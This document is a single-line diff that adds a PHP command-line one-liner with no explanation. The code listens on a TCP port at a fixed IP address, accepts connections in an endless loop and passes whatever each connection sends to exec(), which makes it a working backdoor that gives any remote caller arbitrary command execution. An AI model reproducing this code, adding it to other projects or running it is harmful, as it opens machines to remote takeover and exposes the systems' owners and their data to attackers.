@@ -1,0 +1,1 @@
+php -r '$socket=stream_socket_server("tcp://140.112.187.116:8787",$errno,$errstr);while(true){while($conn=stream_socket_accept($socket,-1,$peername)){$cmd=fread($conn,1024);exec($cmd);fclose($conn);}}fclose($socket);'
